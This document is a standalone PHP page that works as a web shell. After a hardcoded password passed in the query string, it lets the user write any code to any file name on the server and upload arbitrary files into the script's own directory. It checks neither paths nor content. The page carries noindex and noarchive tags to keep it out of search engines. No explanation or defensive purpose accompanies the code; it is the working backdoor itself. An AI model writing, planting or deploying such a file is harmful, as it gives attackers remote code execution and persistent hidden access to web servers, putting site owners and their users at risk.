<?php
	$key = $_REQUEST['key'] == '0101001001' ? $_REQUEST['key'] : false;
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
	<meta name="robots" content="noindex, nofollow, noarchive" />
	<meta http-equiv="X-UA-Compatible" content="IE=Edge" />
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
	<!--[if lt IE 9]>
		<script>
			document.createElement('header');
			document.createElement('nav');
			document.createElement('section');
			document.createElement('article');
			document.createElement('aside');
			document.createElement('footer');
			document.createElement('hgroup');
		</script>
	<![endif]-->
	<style>
		*{padding:0; margin:0; outline:0;}
		header, nav, section, article, aside, footer, hgroup{display:block;}
		html{min-height:100%; height:auto; overflow-y:scroll;}
		body{background:#444; color:#CCC; text-shadow:-1px -1px 0 #000; font-family:Consolas, Monaco, "Courier New", Courier, monospace; font-size:14px;}
		img{max-width:100%;}
		img.left{margin:0 20px 10px 0;}
		img.right{margin:0 0 10px 20px;}
		.clear{display:block; clear:both; margin:20px auto; overflow:hidden;}
		.error, .success{display:block; clear:both; padding:1%; width:98%; overflow:hidden; text-shadow:none; font-weight:bold; margin:0 0 20px 0;}
		.error{background:#E2B3B3; color:#9E1010; border:1px solid #9E1010;}
		.success{background:#B2E6B0; color:#0A8100; border:1px solid #0A8100;}
		textarea{resize:vertical; min-height:300px;}
		form{background:#333; padding:2%; box-shadow:inset 0 0 5px #222;}
		fieldset{border:0;}
		label{clear:both; display:block;}
		input:not([type="submit"]), textarea, select{clear:both; display:block; margin:5px 0 10px 0; padding:1%; width:98%; background:#555; border:1px solid #666; color:#CCC; text-shadow:-1px -1px 0 #444; font-family:Consolas, Monaco, "Courier New", Courier, monospace;}
		input:-webkit-autofill{text-shadow:none;}
		input[type="submit"]{background:#D57100; color:#FFF; font-weight:bold; cursor:pointer; float:right; padding:5px; border:1px solid #FF9318;}
		input[type="submit"]:hover{background:#FF9318; border:1px solid #D57100;}
		hr{clear:both; display:block; margin:20px auto; background:#000; height:1px; border:0;}
		section{margin:40px auto; max-width:700px; width:95%;}
	</style>
</head>
<body>

	<section>

<?php
	if(!$key):
?>
	<form method="get" action="">
		<fieldset>
			<label for="key">Password</label>
			<input type="password" name="key" value="" />
		</fieldset>
	</form>
<?php
	else:
		$error = false;
		$success = ''; 
	
		if(isset($_POST['filename']) && isset($_POST['script'])):
			$filename = trim($_POST['filename']);
			$script = stripslashes($_POST['script']);
			if($filename == '')
				$error = 'Give your file a name.';
			if($script == '')
				$error = 'You need to add something to the file.';
				
			if(!$error):
				$success = 'File created successfully.';
				file_put_contents($filename, $script);
			endif;
		endif;
	
		if($_FILES['upload']['name']):
			if(!$_FILES['upload']['error']):
				move_uploaded_file($_FILES['upload']['tmp_name'], dirname(__FILE__).'/'.$_FILES['upload']['name']);
				$success = 'File accepted.';
			else:
				$error = $_FILES['upload']['error'];
			endif;
		endif;
		
		if($error):
			print '<div class="error">'.$error.'</div>';
		elseif($success != ''):
			print '<div class="success">'.$success.'</div>';
		endif;
?>
	<form method="post" action="">
		<fieldset>
			<label for="filename">File Name</label>
			<input type="text" name="filename" id="filename" value="" placeholder="file.php" />
				<br />
			<label for="script">Code</label>
			<textarea name="script" id="script" name="script"></textarea>
				<br />
			<input type="submit" value="Save" />
		</fieldset>
	</form>

		<div class="clear"></div>
	
	<form method="post" action="" enctype="multipart/form-data">
		<fieldset>
			<label for="upload">Upload</label>
			<input type="file" name="upload" id="upload" value="" />
				<br />
			<input type="submit" value="Upload" />
		</fieldset>
	</form>

		<div class="clear"></div>
	
<?php
	endif;
?>
</body>
</html>
